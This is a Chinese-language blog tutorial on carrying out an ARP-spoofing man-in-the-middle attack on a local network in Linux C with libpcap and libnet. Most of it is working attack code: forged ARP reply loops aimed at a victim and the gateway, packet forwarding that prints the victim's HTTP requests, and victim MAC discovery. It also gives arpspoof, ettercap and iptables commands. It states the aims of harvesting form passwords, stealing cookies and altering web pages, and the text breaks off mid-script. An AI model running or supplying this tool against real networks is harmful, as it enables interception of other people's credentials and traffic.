---
layout: post
title: Linux C 实现局域网中基于ARP欺骗的中间人攻击
tags:
- Net Attack
- C
categories: Network
---
什么是中间人攻击？什么是ARP欺骗？本文主要讲在Linux环境下用C语言实现局域网中基于ARP欺骗的中间人攻击，同时介绍一下Linux中libpcap和libnet库的应用。

## 中间人攻击与ARP欺骗介绍

### ARP欺骗

首先介绍一下ARP（地址解析协议），其基本功能为透过目标设备的IP地址，查询目标设备的MAC地址。在以太网协议中规定，同一局域网中的一台主机要和另一台主机进行直接通信，必须要知道目标主机的MAC地址。但是在TCP/IP协议中，网络层和传输层只关心目标主机的IP地址。于是就需要一种协议，将网络层地址转换为链路层地址，这就是ARP。

ARP欺骗（ARP spoofing），是针对以太网络地址解析协议（ARP）的一种攻击技术。通过对目标主机发送ARP请求包或者是ARP相应包，来实现更新目标主机的ARP缓存，让目标主机的ARP缓存中ipA对应的MAC地址更改为另一台错误主机的MAC地址，使得目标主机在发送数据包的时候，将本应发给ipA对应的主机的数据包发送给了错误的主机。简而言之，就是一种对目标主机数据包的重定向。

ARP欺骗的实现可以发送伪造的ARP应答包或者请求包，一旦目标主机接受，其ARP缓存即被更新。

### 中间人攻击

中间人攻击（Man-in-the-middle attack，缩写：MITM），是指攻击者与通讯的两端分别创建独立的联系，并交换其所收到的数据，使通讯的两端认为他们正在通过一个私密的连接与对方直接对话，但事实上整个会话都被攻击者完全控制。

中间人攻击的步骤其实很简单，总结下来就是三步：

1. 首先发送ARP欺骗包给目标主机，对其声称“我是网关”。
2. 接着发送ARP欺骗包给网关，对其声称“我是目标主机”。
3. 对数据包的处理

接着我们来分析一下上面的步骤。

* 首先，第一步完成之后，目标主机会认为网关是攻击者的电脑，因此其上网的所有的数据就会被重定向到攻击者的电脑
* 接着，第二步欺骗网关，这样有两个好处，一来是，网关为了保证与局域网内各个主机建立联系，会时不时向各个主机发送ARP请求包，如何我们不管它的话，目标主机的ARP缓存很有可能又被网关给更新回去。二来是，如果我们不这样做的话，当我们把目标主机的数据包转发给网关之后，网关会直接发给目标主机，这样数据就不经过我们这里了，对网关的再次欺骗正好可以保证数据一定从我们手中经过。
* 如果成功进行对双方的ARP欺骗之后，我们什么也不管，那目标主机就断网了，因为他的数据包无法发送出去，如果我们再帮他转发数据包，就能实现目标主机网络的“修复”，实际上他所有的信息都经过我们的手里。此后我们可以监控目标主机上网，获取目标主机提交的表单信息，获取目标主机的cookie，修改网页的内容等等......

## 各种数据包的头部

这里只讲网络传输过程中的四层结构的C语言数据结构

首先我们给出一些定义，这些定义在一些头文件里面有定义，这里我们自己定义一下

```
/* ethernet type */
#define EPT_IPv4    0x0800
#define EPT_IPv6    0x86dd
#define EPT_ARP     0x0806
#define EPT_RARP    0x8035

/* protocol type */
#define PROTOCOL_TCP    0x06
#define PROTOCOL_UDP    0x11

/* address length */
#define MAC_ADDR_LEN 6
#define IP_ADDR_LEN 4

/* arp option */
#define ARP_REPLY 2
#define ARP_REQURST 1
```

### 以太网头部

```c
/* ethernet head */
typedef struct {
    u_char DST_mac[6];
    u_char SRC_mac[6];
    u_short eth_type;
} ethernet_header;
```

以太网头部，总长度14

* DST_mac: 目标的MAC地址
* SRC_mac: 发送方的MAC地址
* u_short: 上层协议类型，宏定义见上

### ARP包头部

以太网头部和APR头部如下图

![](https://raw.githubusercontent.com/zxc479773533/zxc479773533.github.io/master/_posts/images/MITM-Attack-01.png)

```c
/* ARP packet head */
typedef struct {
    u_short hardware_type;
    u_short protocol_type;
    u_char hardware_len;
    u_char protocol_len;
    u_short arp_option;
    u_char src_mac[6];
    u_char src_ip[4];
    u_char dest_mac[6];
    u_char dest_ip[4];
} arp_header;
```

ARP头部，总长度28

* hardware_type: 硬件类型
* protocol_type: 协议类型
* hardware_len: 硬件地址长度(6)
* protocol_len: 协议地址长度(4)
* arp_option: ARP操作符，确定是应答包还是请求包
* src_mac: 源MAC地址
* src_ip: 目标MAC地址
* dest_mac: 源IP地址
* dest_ip: 目标IP地址

### IP数据包头部

IP数据包头部结构如下图

![](https://raw.githubusercontent.com/zxc479773533/zxc479773533.github.io/master/_posts/images/MITM-Attack-02.png)

```c
/* ip packet head */
typedef struct {
    u_char verson_head;
    u_char type_of_service;
    u_short packet_len;
    u_short packet_id;
    u_short slice_info;
    u_char TTL;
    u_char protocol_type;
    u_short check_sum;
    u_char src_ip[4];
    u_char dest_ip[4];
} ip_header;
```
IP头部，总长度20

* verson_head: 版本信息
* type_of_service: 服务类型
* packet_len: 数据包长度
* packet_id: 数据包标识
* slice_info: 分片信息
* TTL: 存活时间
* protocol_type: 协议类型
* check_sum: 校验和
* src_ip: 源IP地址
* dest_ip: 目标IP地址

### TCP数据包头部

TCP数据包头部结构如下图

![](https://raw.githubusercontent.com/zxc479773533/zxc479773533.github.io/master/_posts/images/MITM-Attack-03.png)

```c
/* TCP packet head */
typedef struct {
    u_short sour_port;
    u_short dest_port;
    u_int sequ_num;
    u_int ackn_num;
    u_short header_len_flag;
    u_short window;
    u_short check_sum;
    u_short surg_point;
} tcp_header;
```

TCP头部，总长度20

* sour_port: 源端口
* dest_port: 目标端口
* sequ_num: 序列号
* ackn_num: 确认号
* header_len_flag: TCP头长度
* window: 窗口大小
* check_sum: 校验和
* surg_point: 紧急指针

>一点自己的说明：事实上，一个功能完备的头部根本没有这么简单,在<netinet/ip.h>等头文件中还有着完备的定义。至于这里我们进行中间人攻击，已经足够了，自己定义只是为了熟悉结构。

### HTTP报文的头部

HTTP报文也有两种，请求报文和响应报文。

至于具体的内容，我就不多讲了，只说需要注意的几项。

* POST方式的请求报文中会包含表单的信息，扒密码可用。
* 请求报文中含有cookie
* HTML文档就在响应报文的头部之后。

整个数据包的结构是：

Ethernet { IP [ TCP ( HTTP ) ] }

## 整体把握

首先，目标主机的MAC地址和IP地址当然是必须的，除此以外我们还需要自己的MAC地址，为诱导目标主机和网关将数据包发送过来。

整个过程中我们还需要网卡设备指针，在每次抓包时候用的过滤表达式。

于是将各部分封装为一个结构体供我们之后使用。

```c
/* MITM information */
typedef struct {
    u_char *TARGET_MAC;
    u_char *ATTACKER_MAC;
    u_char *GATEWAY_MAC;
    u_char *TARGET_IP;
    u_char *GATEWAY_IP;
    char *dev;
    char *filter;
    int mode; //模式的选择
} MITM_info;
```

发送伪造的ARP包是不能停止的，否则有可能机器自己更新自己的ARP缓存就摆脱了我们的控制，同时转发功能也是不能停止的，因此我们考虑使用多线程编程。

发送伪造的ARP包可以占用一个线程，转发需要多开几个线程，这里我们后面会讲到。

>一点自己的说明：不要总是认为网关就是192.168.1.1，经过我自己调查，一些宾馆往往喜欢把网关地址改为靠后的(接近255)的数字

## 数据包的嗅探与libpcap

### libpcap介绍

libpcap是一个Linux下的C语言库，其英文全称是Packet Capture library，即数据包捕获库。下面先简单的介绍几个函数的用法。

`char errbuf[PCAP_ERRBUF_SIZE];`

该数组用于存储错误信息。

`char *pcap_lookupdev(char *errbuf) `

该函数用于获得网络设备(网卡)的指针，自动寻找第一个可用的设备，参数是错误信息。

`int pcap_lookupnet(char *device, bpf_u_int32 *netp,bpf_u_int32 *maskp, char *errbuf) `

该函数用于获得指定设备的网络号和子网掩码。

`pcap_t *pcap_open_live(char *device, int snaplen, int promisc, int to_ms, char *ebuf) `

该函数用于获得用于捕获网络数据包的数据包捕获描述字。snaplen参数定义捕获数据的最大字节数，65536即可获得所有数据包。promisc指定是否将网络接口置于混杂模式。to_ms参数指定超时时间（毫秒）。

`char filter_app[100]`

存放过滤表达式的数组，关于过滤表达式的格式，请看[这里](http://www.tcpdump.org/manpages/pcap-filter.7.html)。

`struct bpf_program filter`

存放过滤器的结构。

`int pcap_compile(pcap_t *p, struct bpf_program *fp,char *str, int optimize, bpf_u_int32 netmask)`

该函数将过滤表达式编译到过滤程序中去。optimize参数控制结果代码的优化。netmask参数指定本地网络的网络掩码。

`int pcap_setfilter(pcap_t *p, struct bpf_program *fp)`

该函数指定一个过滤程序。

`int pcap_loop(pcap_t *p, int cnt, pcap_handler callback, u_char *user)`

该函数用于捕获数据包，callback是捕获数据包后的回调函数，用于处理数据包，user是封装好的回调函数的参数结构。

`void callback(u_char *user, const struct pcap_pkthdr *hp, const u_char *packet)`

pcap_loop的回调函数，hp是一个存放有数据包信息的结构指针，packet是数据包内容指针。

### Sniffer实现

利用libpcap库，我们按着寻找设备，打开设备，捕获数据，回调处理的步骤实现。

该模块主函数：

```c
void Sniffer(const char *filter_exp) {

    /* definations */
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    u_int mask;
    u_int net_addr;
    char *net;
    char *real_mask;
    struct in_addr addr_net;
    pcap_t *handle;
    struct bpf_program filter;
    char filter_app[100];

    /* start dev */
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL) {
        printf("%s\n", errbuf);
        exit(1);
    }

    /* start device */
    if (pcap_lookupnet(dev, &net_addr, &mask, errbuf) == -1) {
        printf("%s\n", errbuf); //打印错误信息
        exit(1); //结束程序
    }
    addr_net.s_addr = mask;
    real_mask = inet_ntoa(addr_net);
    printf("\nmask: %s\n", real_mask);
    addr_net.s_addr = net_addr;
    net = inet_ntoa(addr_net);
    printf("net: %s\n\n", net);
    handle = pcap_open_live(dev, 65536, 1, 1000, errbuf);
    if (!handle) {
        printf("%s\n", errbuf);
        printf("If the Problem is \"you don't have permission\", please run this program as root!\n");
        exit(1);
    }

    /* filtering */
    if (filter_exp != NULL) strcpy(filter_app, filter_exp);
    pcap_compile(handle, &filter, filter_app, 0, *net);
    pcap_setfilter(handle, &filter);

    /* loop capturing */
    printf("\nstart sniff:\n\n");
    pcap_loop(handle, -1, proc_pkt, NULL);

    /* end */
    pcap_close(handle);
}
```

回调函数：

```c
/* print ether type */
void print_type(u_short type) {
    switch (type) {
        case EPT_IPv4: printf("eth type: IPv4\n"); break;
        case EPT_IPv6: printf("eth type: IPv6\n"); break;
        case EPT_ARP: printf("eth type: ARP\n"); break;
        case EPT_RARP: printf("eth type: RARP\n"); break;
        default: printf("eth type: Unknown type\n");
    }
}

/* print protocol type*/
void print_protocol(u_char protocol_type) {
    switch (protocol_type) {
        case PROTOCOL_TCP: printf("protocol type: TCP\n"); break;
        case PROTOCOL_UDP: printf("protocol type: UDP\n"); break;
        default: printf("Unknown type\n");
    }
}

/*analyze the packet */
void proc_pkt(u_char *user, const struct pcap_pkthdr *hp, const u_char *packet) {

    /* settle ethernet */
    ethernet_header *pEther;
    ip_header *pIpv4;
    arp_header *pArp;
    pEther = (ethernet_header *)packet;
    printf("-------------------------------------\n");
    print_type(ntohs(pEther->eth_type));
    printf("eth src MAC address is: ");
    print_mac(pEther->SRC_mac);  
    printf("eth des MAC address is: ");
    print_mac(pEther->DST_mac);
    
    /* settle ip */
    if (ntohs(pEther->eth_type) == EPT_IPv4) {
        pIpv4 = (ip_header *)(packet + sizeof(ethernet_header));
        print_protocol(pIpv4->protocol_type);
        printf("src IP address is: ");
        print_ip(pIpv4->src_ip);
        printf("des IP address is: ");
        print_ip(pIpv4->dest_ip);
        
        /* settle port */
        if (pIpv4->protocol_type == PROTOCOL_TCP) {
            tcp_header *pTcp;
            pTcp = (tcp_header *)(packet + sizeof(ethernet_header) + sizeof(ip_header));
            printf("src port address is: %hu\n", ntohs(pTcp->sour_port));
            printf("des port address is: %hu\n", ntohs(pTcp->dest_port));
        }
        else if (pIpv4->protocol_type == PROTOCOL_UDP) {
            udp_header *pUdp;
            pUdp = (udp_header *)(packet + sizeof(ethernet_header) + sizeof(ip_header));
            printf("src port address is: %hu\n", ntohs(pUdp->sour_port));
            printf("des port address is: %hu\n", ntohs(pUdp->dest_port));
        }
    }
    
    /* settle arp packet */
    else if (ntohs(pEther->eth_type) == EPT_ARP) {
        pArp = (arp_header *)(packet + sizeof(ethernet_header));
        printf("src MAC address is: ");
        print_mac(pArp->src_mac);
        printf("eth des MAC address is: ");
        print_mac(pArp->dest_mac);
        printf("src IP address is: ");
        print_ip(pArp->src_ip);
        printf("des IP address is: ");
        print_ip(pArp->dest_ip);
    }
}
```

>一点自己的说明：这里我只开了一个线程，在实际的应用中，大规模抓包可以开启很多线程，利用pcap_dump()函数将数据包保存到本地。

这里我们的Sniffer函数的参数是一个指向过滤表达式的指针，之后程序根据过滤表达式进行筛选抓取数据包，分析数据包内容并打印结果。

>一点自己的说明：这是一个危险的操作，你可以在构建数据包的时候利用广播地址对局域网内所有主机发送伪造的ARP请求包，这样的后果是所有的主机会响应你，他们均认为你是网关，会造成局域网内全员断网，而你会很快的暴露。

## 数据包发送与libnet

### libnet介绍

libnet 是一个小型的接口函数库，主要用 C 语言写成，提供了低层网络数据包的构造、处理和发送功能。具有非常强大的数据包构建和发送功能。

`libnet_t *libnet_init(int injection_type, char *device, char *err_buf)`

该函数用于libnet句柄初始化，其中injection_type是构造的类型，其可选为：

* LIBNET_LINK，链路层
* LIBNET_RAW4，网络接口层（网络层）
* LIBNET_LINK_ADV，链路层高级版本
* LIBNET_RAW4_ADV，网络层高级版本

`void libnet_destroy(libnet_t *l)`

该函数用于释放资源，当创建失败或者是发送之后，及时释放资源。

`libnet_ptag_t libnet_build_ethernet(u_int8_t*dst, u_int8_t *src,u_int16_ttype, u_int8_t*payload,u_int32_tpayload_s, libnet_t*l,libnet_ptag_t ptag )`

该函数用于构建以太网帧头部，各参数为：

* dst：目的 mac
* src：源 mac
* type：上层协议类型
* payload：负载
* payload_s：负载长度
* l：libnet 句柄，libnet_init() 返回的 libnet * 指针
* ptag：协议标记，第一次组新的发送包时，这里写 0，同一个应用程序，下一次再组包时，这个位置的值写此函数的返回值。

返回值：

* 成功：协议标记
* 失败：-1

`libnet_ptag_t libnet_build_arp(u_int16_t hrd, u_int16_t pro,u_int8_t hln, u_int8_t pln，u_int16_t op, u_int8_t *sha,u_int8_t *spa, u_int8_t *tha，u_int8_t *tpa, u_int8_t *payload，u_int32_t payload_s, libnet_t *l,libnet_ptag_t ptag )`

该函数用于构建ARP包头部，各参数为：

* hrd：硬件地址格式，ARPHRD_ETHER（以太网）
* pro：协议地址格式，ETHERTYPE_IP（ IP协议）
* hln：硬件地址长度
* pln：协议地址长度
* op：ARP协议操作类型（1：ARP请求，2：ARP回应，3：RARP请求，4：RARP回应）
* sha：发送者硬件地址
* spa：发送者协议地址
* tha：目标硬件地址
* tpa：目标协议地址
* payload：负载，写 NULL就好
* payload_s：负载长度，写0就好
* l：libnet 句柄，libnet_init() 返回的 libnet * 指针
* ptag：协议标记，第一次组新的发送包时，这里写 0，同一个应用程序，下一次再组包时，这个位置的值写此函数的返回值。

返回值：

* 成功：协议标记
* 失败：-1

`libnet_ptag_t libnet_build_ipv4(u_int16_t ip_len, u_int8_t tos,u_int16_t id, u_int16_t flag,u_int8_t ttl, u_int8_t prot,u_int16 sum, u_int32_t src,u_int32_t dst, u_int8_t *payload,u_int32_t payload_s,libnet_t *l,libnet_ptag_t ptag )`

该函数用于构建IP数据包头部，各参数为：

* ip_len：ip 包总长
* tos：服务类型
* id：ip 标识
* flag：片偏移
* ttl：生存时间
* prot：上层协议
* sum：校验和，设为 0的话系统会自动计算
* src：源 ip 地址
* dst：目的ip地址
* payload：负载
* payload_s：负载长度
* l：libnet 句柄，libnet_init() 返回的 libnet * 指针
* ptag：协议标记，第一次组新的发送包时，这里写 0，同一个应用程序，下一次再组包时，这个位置的值写此函数的返回值。

返回值：

* 成功：协议标记
* 失败：-1

`libnet_ptag_t libnet_build_tcp(u_int16_t sp, u_int16_t dp,u_int32_t seq, u_int32_t ack,u_int8_t control, u_int16_t win,u_int16_t sum, u_int16_t urg,u_int16_t len, u_int8_t *payload,u_int32_t payload_s, libnet_t *l,libnet_ptag_t ptag )`

该函数用于构建TCP数据包，各参数为：

* sp：源端口号
* dp：目的端口号
* seq：序号
* ack：ack 标记
* control：控制标记
* win：窗口大小
* sum：校验和，设为 0的话，系统会自动计算
* urg：紧急指针
* len：tcp包长度
* payload：负载，为给应用程序发送的文本内容
* payload_s：负载长度
* l：libnet_init() 返回的 libnet * 指针
* ptag：协议标记，第一次组新的发送包时，这里写 0，同一个应用程序，下一次再组包时，这个位置的值写此函数的返回值。

返回值：

* 成功：协议标记
* 失败：-1

`int libnet_write(libnet_t * l)`

该函数用于数据包的发送，参数为libnet句柄。

>一点自己的说明：我看了下libnet的源码，事实上libnet就是建立在Socket基础上的，专门针对各种数据包进行了一下封装，事实上libnet构造数据包的函数远不及此，ICMP包之类的其他包还有很多，我们还可以利用它实现基于ping的存活主机扫描程序，DDos攻击程序

### Arpspoof实现

为了保证目标和网关持续处于被欺骗的状态，我们持续发包处理。

```c
void Arpspoof(void *ARG) {
    MITM_info arg = *(MITM_info *)ARG;
    while (1) {
        /* sent to victim */
        send_fake_ARP(arg.dev, arg.ATTACKER_MAC, arg.TARGET_MAC, arg.GATEWAY_IP, arg.TARGET_IP, ARP_REPLY);
        usleep(500000);
        /* sent to gateway */
        send_fake_ARP(arg.dev, arg.ATTACKER_MAC, arg.GATEWAY_MAC, arg.TARGET_IP, arg.GATEWAY_IP, ARP_REPLY);
        usleep(500000);
   
```

利用libnet构建ARP数据包：

* 对于目标主机，目标MAC和目标IP设置为目标主机的，源MAC设置为自己的，源IP设置为网关的。这样的ARP应答包一旦被目标主机接收，其ARP缓存中对应于网关的IP地址的MAC就变成我们的了，此后目标主机再发包，目的地就全部会变成我们。
* 对于网关，同样的，目标MAC和目标IP设置为网关的，源MAC设置为自己的，源IP设置为目标主机的。

```c
int send_fake_ARP(char *dev, u_char *srcMac, u_char *dstMac, u_char *srcIp, u_char *dstIp, int op) {

    /* definations */
    libnet_t *net_t = NULL;
    static u_char padPtr[18];
    char err_buf[LIBNET_ERRBUF_SIZE];
    libnet_ptag_t p_tag;
    int res;

    /* start libnet */
    net_t = libnet_init(LIBNET_LINK_ADV, dev, err_buf);
    if (net_t == NULL) {
        printf("libnet start error\n");
        return 1;
    }

    /* build ARP */
    p_tag = libnet_build_arp(ARPHRD_ETHER, EPT_IPv4, MAC_ADDR_LEN, IP_ADDR_LEN, op,
    srcMac, srcIp, dstMac, dstIp, padPtr, 18, net_t, 0);
    if (p_tag == -1) {
        printf("libnet build_arp error\n");
        libnet_destroy(net_t);
        return 1;
    }

    /* build ethernet */
    p_tag = libnet_build_ethernet(dstMac, srcMac, EPT_ARP, padPtr, 0, net_t, 0);
    if (p_tag == -1) {
        printf("libnet build_ethernet error\n");
        libnet_destroy(net_t);
        return 1;
    }

    /* send packet */
    res = libnet_write(net_t);
    if (res == -1) {
        printf("ARP libnet write error\n");
        libnet_destroy(net_t);
        return 1;
    }

    /* success */
    libnet_destroy(net_t);
    return 0;
}
```

>一点自己的说明：其实libpcap也有一个发包的函数，pcap_sendpacket()函数，是要先完全构建好packet，再用这个函数全部发送出去，我个人在尝试的过程中，ARP欺骗包用这个发送没有问题，但是在转发的过程中出现了一些问题，至于具体的原因我还没有想清楚，到是发包比较专业的libnet实现了这个目标，后来就使用libnet包了。然而pcap_sendpacket()函数仍然有着发包非常迅速的特点，这使得在有些问题上(比如Dos攻击)就非常适合使用它。

## 数据包的转发

这里我们采用，多线程抓包，并在抓到包之后迅速处理并转发。

因为数据包是转瞬即逝的，如果捕获一个，处理，再捕获下一个的话可能会漏掉一些数据包，降低我们的效率。

可能有人会问到，为什么非要先ARP欺骗呢，直接抓包并转发不就好了吗？

这里要明确，“抓包”是复制一份包，而不是截获包，而现在被ARP欺骗的主机已经断网的情况下，我们复制它的包帮他转发，这样才是经过我们的手帮他实现上网。

原理并不难，对于发来的包进行分析，确认是目标主机发来的，我们就帮他转发到网关，确认是网关发来的，我们就帮他转发到目标主机

打开设备并抓包的函数：

```c
int forward_packet(void *ARG) {

    /* defination */
    MITM_info arg = *(MITM_info *)ARG;
    char *dev = arg.dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program filter;
    
    /* start dev */
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL) {
        printf("%s\n", errbuf);
        exit(1);
    }
    arg.dev = dev;

    /* open device */
    pcap_t *handle = pcap_open_live(dev, 65535, 1, 0, errbuf);
    if (!handle) {
        printf("device open error.\n");
        exit(1);
    }

    /* compile filter */
    pcap_compile(handle, &filter, arg.filter, 1, 0);  
    pcap_setfilter(handle, &filter);

    /* capture packets */
    pcap_loop(handle, -1, getPacket, (u_char *)&arg);

    /* end */
    pcap_close(handle);

    return 0;
}
```

抓包之后的回调函数，分析数据包并判断下一次操作：

```c
void getPacket(u_char *arg, const struct pcap_pkthdr *hp, const u_char *packet) {

    /* get args */
    MITM_info MITM_arg = *(MITM_info *)arg;
    int Times = 1;
    u_short type = EPT_IPv4;
    char *dev = MITM_arg.dev;
    u_char *victim_mac = MITM_arg.TARGET_MAC;
    u_char *gateway_mac = MITM_arg.GATEWAY_MAC;
    u_char *attacker_mac = MITM_arg.ATTACKER_MAC;
    u_char *victim_ip = MITM_arg.TARGET_IP;
    u_char *gateway_ip = MITM_arg.GATEWAY_IP;

    /* get packet information */
    ethernet_header *pEther = (ethernet_header *)packet;
    ip_header *pIpv4 = (ip_header *)(packet + 14);
    tcp_header *pTcp = (tcp_header *)(packet + 34);
    char *data = (char *)(packet + 54);

    /* get packet form victim */
    if (!memcmp(pEther->SRC_mac, victim_mac, 6)) {
        char *p = strstr(data, "HTTP");
        if (p != NULL) printf("%s\n", data);
        forward(dev, type, gateway_mac, attacker_mac, packet + 14, hp->len - 14, Times);
    }
    else if (!memcmp(pEther->SRC_mac, gateway_mac, 6)) {
        forward(dev, type, victim_mac, attacker_mac, packet + 14, hp->len - 14, Times);
    }
}
```

这里我们打印了目标主机的HTTP请求来监控他上网。

之后是利用libnet再构建一个链路层数据包并发送回去：

```c
int forward(char *dev, u_short pro_type, u_char *DST, u_char *SRC, const u_char *payload, int len, int Times) {

    /* definations */
    libnet_t *net_t = NULL;
    char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_ptag_t p_tag;
    int res;

    /* start libnet */
    net_t = libnet_init(LIBNET_LINK_ADV, dev, errbuf);
    if (net_t == NULL) {
        printf("libnet start error\n");
        return 1;
    }

    /* build ethernet */
    p_tag = libnet_build_ethernet(DST, SRC, pro_type, payload, len, net_t, 0);
    if (p_tag == -1) {
        printf("libnet build error\n");
        libnet_destroy(net_t);
        return 1;
    }

    /* send packet */
    for (int i = 0; i < Times; i++) {
        res = libnet_write(net_t);
        if (res == -1) {
            printf("IP libnet write error\n");
            libnet_destroy(net_t);
            return 1;
        }
    }
    
    /* success */
    libnet_destroy(net_t);
    return 0;
}
```

## 优化获取

五个地址，总不能完全让用户输入吧，因此，怎么简化用户体验也是我们应该注意的事情。

网关IP和用户IP是会随着网关变化的，我们把简单的IP两个地址让用户输入，MAC地址用程序获取。

首先是获得自己的MAC，用Socket里的icotl函数即可：

```c
    /* get attacker's mac */
    int sockfd;
    static struct ifreq req;
    sockfd = socket(PF_INET, SOCK_DGRAM, 0);
    strcpy(req.ifr_name, dev);
    ioctl(sockfd, SIOCGIFHWADDR, &req);
    print_mac((u_char *)req.ifr_hwaddr.sa_data);
    memcpy(ATTACKER_MAC, (u_char *)req.ifr_hwaddr.sa_data, 6);
    printf("\n");
```

目标的MAC可以用ping来实现，而网关直接抓包就好。

完整的代码如下：

```c
#include "head.h"

u_char TARGET_MAC[6];
u_char ATTACKER_MAC[6];
u_char GATEWAY_MAC[6];
u_char TARGET_IP[4];
u_char GATEWAY_IP[4];

/* print mac address */
void print_mac(u_char *mac) {
    int i;
    for (i = 0; i < 6; i++) {
        if (mac[i] < 16) printf("0");
        printf("%x", mac[i]);
        if (i < 5) printf(":");
    }
    printf("\n");
}

/* print ip address */
void print_ip(u_char *ip) {
    int i;
    for (i = 0; i < 4; i++) {
        printf("%d", ip[i]);
        if (i < 3) printf(".");
    }
    printf("\n");
}

/* htoi */
int htoi(char h) {
    if ('0' <= h && h <= '9')
        return h - '0';
    else
        return h - 'a' + 10;
}

/* get mac address */
void get_mac(u_char *mac, char *str) {
    mac[0] = htoi(str[0]) * 16 + htoi(str[1]);
    mac[1] = htoi(str[3]) * 16 + htoi(str[4]);
    mac[2] = htoi(str[6]) * 16 + htoi(str[7]);
    mac[3] = htoi(str[9]) * 16 + htoi(str[10]);
    mac[4] = htoi(str[12]) * 16 + htoi(str[13]);
    mac[5] = htoi(str[15]) * 16 + htoi(str[16]);
}

/* get gatway's mac */
void getgateway(u_char *user, const struct pcap_pkthdr *hp, const u_char *packet) {
    ethernet_header *pEther = (ethernet_header *)packet;
    printf("The gateway's MAC address is : ");
    print_mac(pEther->SRC_mac);
    memcpy(GATEWAY_MAC ,pEther->SRC_mac, 6);
    printf("\n");
}

void Getinfo(MITM_info *arg) {

    /* definations */
    char *dev;
    char errbuf[PCAP_ERRBUF_SIZE];
    u_int mask;
    u_int net_addr;
    char *net;
    char *real_mask;
    struct in_addr addr_net;
    pcap_t *handle;

    /* start dev */
    dev = pcap_lookupdev(errbuf);
    if (dev == NULL) {
        printf("%s\n", errbuf);
        exit(1);
    }

    /* open device */
    if (pcap_lookupnet(dev, &net_addr, &mask, errbuf) == -1) {
        printf("%s\n", errbuf); //打印错误信息
        exit(1); //结束程序
    }
    addr_net.s_addr = net_addr;
    net = inet_ntoa(addr_net);
    handle = pcap_open_live(dev, 65536, 1, 1000, errbuf);
    if (!handle) {
        printf("%s\n", errbuf);
        printf("If the Problem is \"you don't have permission\", please run this program as root!\n");
        exit(1);
    }

    /* get attacker's mac */
    int sockfd;
    static struct ifreq req;
    sockfd = socket(PF_INET, SOCK_DGRAM, 0);
    strcpy(req.ifr_name, dev);
    ioctl(sockfd, SIOCGIFHWADDR, &req);
    print_mac((u_char *)req.ifr_hwaddr.sa_data);
    memcpy(ATTACKER_MAC, (u_char *)req.ifr_hwaddr.sa_data, 6);
    printf("\n");

    /* enter victim's ip */
    printf("Please enter your victim's IP (format: 192.168.1.0)\n");
    scanf("%hhd.%hhd.%hhd.%hhd", &TARGET_IP[0], &TARGET_IP[1], &TARGET_IP[2], &TARGET_IP[3]);

    /* enter gatewat's ip */
    printf("Please enter your gateway's IP (format: 192.168.1.0)\n");
    scanf("%hhd.%hhd.%hhd.%hhd", &GATEWAY_IP[0], &GATEWAY_IP[1], &GATEWAY_IP[2], &GATEWAY_IP[3]);

    /* get attack resource */
    printf("\nGetting your victim's MAC......\n");
    char ip[20], ping[40] = "ping -c 3 > data/ping.txt ", arp[30] = "arp -e > data/arp.txt ", data[300];
    sprintf(ip,"%d.%d.%d.%d", TARGET_IP[0], TARGET_IP[1], TARGET_IP[2], TARGET_IP[3]);
    strcat(ping, ip), system(ping);
    strcat(arp, ip), system(arp);
    FILE* fp = fopen("data/arp.txt", "r");
    fgets(data, 300, fp);
    fgets(data, 300, fp);
    char *p = strstr(data, "ether");
    if (p == NULL) {
        printf("Not found!\n");
        exit(1);
    }
    get_mac(TARGET_MAC, p + 8);
    printf("His MAC is: ");
    print_mac(TARGET_MAC);
    printf("\n");

    /* get gateway's mac */
    printf("Geting gateway's MAC\n");
    struct bpf_program filter;
    char filter_app[20] = "src ";
    char gateway[15];
    sprintf(gateway, "%d.%d.%d.%d", GATEWAY_IP[0], GATEWAY_IP[1], GATEWAY_IP[2], GATEWAY_IP[3]);
    strcat(filter_app, gateway);
    pcap_compile(handle, &filter, filter_app, 0, *net);
    pcap_setfilter(handle, &filter);
    pcap_loop(handle, 1, getgateway, NULL);
    arg->TARGET_IP = TARGET_IP;
    arg->TARGET_MAC = TARGET_MAC;
    arg->ATTACKER_MAC = ATTACKER_MAC;
    arg->GATEWAY_IP = GATEWAY_IP;
    arg->GATEWAY_MAC = GATEWAY_MAC;
    pcap_close(handle);
}
```

## 其他部分

以上两个部分，ARP欺骗和数据包转发，是核心部分，其他的主函数调度啊，用户界面优化啊之类的就不再博客里写了，具体可以在我的[github](https://github.com/zxc479773533/HUA-JI-YOU)里查看，贴出来的部分只做算法和函数调用的指导。

## 补充——非C语言的实现和一些工具的玩法

推荐一些好玩的工具

### Iptables

Linux下有一个内核级的防火墙iptables，可以利用他实现自动数据包的转发。

首先，你必须开启网卡转发功能（需要root权限）

`# echo 1 > /proc/sys/net/ipv4/ip_forward`

我们上面转发的两个程序可以利用以下两条命令实现：

`# iptables -t nat -A POSTROUTING -p tcp -s 192.168.1.0/24 -j SNAT --to-source 本机IP`

上面这条命令是将所有从本机出去的数据包的源地址改为本机

`# iptables -t nat -A PREROUTING -p tcp -d 本机IP -j DNAT --to 目的主机IP`

上面这条命令是将所有发往本机的数据包在进入之前将目的地址改为目标主机

同时你也可以用Iptables构建你自己的防火墙，拒绝别人的数据包之类的。

[这篇教程](https://lesca.me/archives/iptables-tutorial-structures-configuratios-examples.html)挺好的，讲解Iptables的详细用法。

### arpspoof

一个ARP攻击的工具，实现原理和本程序类似，用法如下：

`#  arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host`

其中，

-i 指定使用的接口。

-c 指定当还原arp配置时t使用的MAC地址，默认为使用原来的MAC。（即当停止arpspoof命令后，默认取消毒化）

-t 指定要毒化的主机，如果不指定的话默认为局域网下所有主机。

-r 双向毒化（host和target），从而双向扑捉数据。（仅当同时指定 -t的时候才有效）

host 为你想要伪装成的主机，通常是本地网关。所有从target到host的数据包都被重定向到本机。

### ettercap

这是一个非常强大的黑客工具，目前挂在github上由一个团队维护，他能实现好几种的网络攻击，当然这里中间人也不例外。

ettercap 只需要一条命令就能完成ARP毒化，转发，篡改数据包（可惜我没能实现）

`# ettercap -i device -Tq -M arp:remote /victim's IP/ /gataway's IP/ -F test.ef`

这里的device是网卡设备名称，filter.ef是过滤脚本

ettercap的过滤脚本语法如下：

```js
if (ip.proto == TCP && tcp.dst == 80)
{
    if (search(DATA.data, "Accept-Encoding"))
    {
